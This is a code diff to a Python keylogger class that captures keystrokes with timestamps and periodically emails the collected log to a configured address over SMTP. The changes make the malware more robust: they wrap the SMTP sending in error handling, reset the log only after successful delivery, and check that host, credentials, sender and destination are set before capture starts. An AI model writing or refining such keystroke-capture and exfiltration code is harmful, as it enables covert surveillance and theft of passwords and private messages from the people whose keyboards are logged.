@@ -4,6 +4,7 @@ from smtplib import SMTP
 from email.mime.text import MIMEText
 import time
 import colors
+from vault_cli import errors
 
 
 class Keylogger(object):
@@ -28,17 +29,24 @@ class Keylogger(object):
             msg["From"] = self.sender
             msg["To"] = self.destination
 
-            conn = SMTP(host=self.host, port=self.port)
-            conn.starttls()
-            conn.login(self.username, self.password)
+            conn = None
             try:
+                conn = SMTP(host=self.host, port=self.port)
+                conn.starttls()
+                conn.login(self.username, self.password)
                 conn.sendmail(self.sender, self.destination,
                               msg.as_string())
+                self.log = ""
+            except Exception as e:
+                errors.report_error('Keylogger email delivery failed',
+                                    exc=e, code='E2001')
             finally:
-                conn.quit()
-
-            self.log = ""
-            self.t1 = time.time()
+                if conn is not None:
+                    try:
+                        conn.quit()
+                    except Exception:
+                        pass
+                self.t1 = time.time()
 
     def log_keypress(self, Key):
         self.log += time.ctime() + ": " + str(Key) + "\n"
@@ -46,6 +54,14 @@ class Keylogger(object):
 
     def start_keylogger(self):
         try:
+            if not all([self.host, self.username, self.password,
+                        self.sender, self.destination]):
+                errors.report_error('Keylogger email settings are incomplete',
+                                    code='E1010',
+                                    hint='Provide -host, -username, -password, '
+                                         '-sender and -destination.')
+                return
+
             self.t1 = time.time()
 
             colors.info("Capturing keystrokes...")
